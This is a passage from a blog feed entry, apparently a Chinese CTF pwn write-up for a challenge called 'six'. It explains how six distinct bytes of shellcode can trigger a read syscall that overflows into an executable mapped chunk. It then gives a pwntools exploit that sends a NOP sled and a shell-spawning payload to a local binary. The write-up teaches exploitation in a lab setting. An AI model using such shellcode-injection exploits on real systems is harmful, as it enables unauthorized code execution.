memcpy(&amp;v5[v6], &amp;s, 7uLL);</span><br><span class="line">  v3(qword_202098, &amp;s);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序刚开始mmap了两个地址，之后要求读入6个字节的shellcode，进入judge_shellcode进行判断，需要六个字节各不相同<br>最后会将src代码复制到第一个chunk 并执行其中的代码</p><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>思路就是六个字节通过系统调用read函数，同时将rsi设置为rsp，即之后输入到栈顶，溢出到第一个chunk(即高地址的chunk)，将shellcode写入即可<br>(大概思路应该是这样，但是题目本身理解的还不是特别清楚，后面还得再看)</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./six&apos;)</span><br><span class="line"></span><br><span class="line">context.arch = &apos;amd64&apos;</span><br><span class="line">sc=&apos;&apos;&apos;push rsp;pop rsi;lahf;xchg edx,eax;syscall&apos;&apos;&apos;</span><br><span class="line">sc = asm(sc)</span><br><span class="line">sh.sendafter(&apos;:&apos;,sc)</span><br><span class="line"></span><br><span class="line">pay = &apos;a&apos;*(0x1000-0x500)</span><br><span class="line">pay+=&apos;\x90&apos;*0x36+asm(shellcraft.sh())</span><br><span class="line">sh.sendline(pay)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;huwang&quot;&gt;&lt;a href=&quot;#huwang&quot; class=&quot;headerlink&quot; title=&quot;huwang&quot;&gt;&lt;/a&gt;huwang&lt;/h1&gt;&lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="stack" scheme="http://siriuswhiter.tk/tags/stack/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
</feed>
